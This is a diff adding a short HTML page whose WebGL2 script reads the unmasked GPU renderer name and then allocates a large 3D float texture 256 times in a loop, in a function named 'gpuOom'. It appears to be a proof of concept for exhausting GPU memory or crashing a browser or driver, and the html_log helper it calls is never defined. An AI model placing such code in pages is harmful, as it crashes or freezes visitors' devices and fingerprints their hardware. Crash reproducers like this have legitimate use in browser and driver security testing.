@@ -1,0 +1,36 @@
+<!DOCTYPE html>
+<html>
+    <body>
+        <canvas width="120" height="120" id="c"></canvas>
+        <script>
+    var canvas = document.querySelector("#c");
+    let webgl2 = canvas.getContext("webgl2");
+
+    const debugInfo = webgl2.getExtension("WEBGL_debug_renderer_info");
+    const supported = webgl2.getSupportedExtensions();
+    const renderer = webgl2.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
+
+    html_log("gpu render renderer");
+    html_log(renderer);
+
+
+    function gpuOom(gl) {
+        var handle = gl.createTexture();
+        gl.bindTexture(gl.TEXTURE_3D, handle);
+
+        const width = 0xc2;
+        const height = 0x541;
+        const depth = 0x40;	// big than 0x40
+        const src = new Float32Array(0x10);
+
+        gl.texStorage3D(gl.TEXTURE_3D, 1, gl.RGBA32F, width, height, depth);
+        gl.texSubImage3D(gl.TEXTURE_3D, 0, 0, 0, 0, 1, 1, 1, gl.RGBA, gl.FLOAT, src);
+    }
+
+    for(let i = 0;i < 0x100;i++) {
+        gpuOom(webgl2);
+    }
+
+        </script>
+    </body>
+</html>
